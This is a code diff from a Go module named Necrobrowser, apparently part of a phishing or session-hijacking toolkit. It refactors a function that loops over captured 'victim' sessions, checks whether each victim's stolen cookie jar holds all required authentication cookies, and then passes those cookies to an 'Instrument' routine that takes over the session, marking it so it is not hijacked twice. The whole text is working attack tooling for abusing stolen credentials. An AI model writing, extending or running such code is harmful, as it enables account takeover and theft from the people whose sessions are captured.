@@ -144,29 +144,21 @@ func (module *Necrobrowser) CheckSessionCookies() {
 
 	// module.Debug("checkSessions: we have %d victim sessions. Checking authenticated ones.. ", len(victims))
 
-	for _, vId := range victims {
-		cookieJar, err := db.GetVictimCookiejar(vId)
-		if err != nil {
-			module.Debug("error fetching victim %s: %s", vId, err)
-		}
-
+	for _, v := range victims {
 		cookiesFound := 0
 		cookiesNeeded := len(triggerValues)
-		for _, cookie := range cookieJar {
+		for _, cookie := range v.Cookies {
 			if Contains(&triggerValues, cookie.Name) {
 				cookiesFound++
 			}
 		}
 
-		v, _ := db.GetVictim(vId)
-
 		// if we find the cookies, and the session has not been already instrumented (== false), then instrument
 		if cookiesNeeded == cookiesFound && !v.SessionInstrumented {
-			module.Instrument(cookieJar, "[]") // TODO add credentials JSON, instead of passing empty [] array
+			module.Instrument(v.Cookies, "[]") // TODO add credentials JSON, instead of passing empty [] array
 			// prevent the session to be instrumented twice
-			db.SetSessionAsInstrumented(vId)
+			_ = db.SetSessionAsInstrumented(v.ID)
 		}
-
 	}
 }
 
